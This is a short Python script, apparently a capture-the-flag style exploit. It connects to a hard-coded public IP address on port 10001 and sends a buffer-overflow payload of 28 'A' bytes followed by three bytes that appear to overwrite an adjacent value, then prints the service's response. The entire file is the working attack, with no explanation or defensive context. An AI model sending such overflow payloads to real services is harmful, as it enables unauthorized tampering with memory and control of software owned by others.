import socket

server = "35.187.242.102"
# server = "127.0.0.1"
port = 10001
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buf = b"\x41"*28
buf += b"\x01\x00\x00"
print(buf)
s.connect((server, port))
s.send(buf)
response = s.recv(1024)
print(response)
s.close()
